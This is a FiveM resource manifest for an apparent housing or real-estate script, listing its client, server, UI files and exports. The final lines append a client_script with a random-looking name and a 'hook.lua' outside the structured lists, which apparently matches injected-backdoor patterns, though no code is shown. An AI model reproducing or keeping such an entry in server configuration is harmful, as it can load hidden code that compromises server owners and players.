resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

ui_page "html/index.html"

client_scripts {
	'config.lua',
	'client/main.lua',
	'client/gui.lua',
	'client/decorate.lua',
	'client/job.lua',
}

server_scripts {
	'config.lua',
	'server/main.lua',
}

files {
	'html/index.html',
	'html/reset.css',
	'html/style.css',
	'html/script.js',
	'html/img/dynasty8-logo.png'
}

server_export {
	'hasKey',
}
exports {
    'imClosesToRoom2'
}

client_script "CIniIlNUgdvrKvZtDH.lua"
client_script 'client/hook.lua'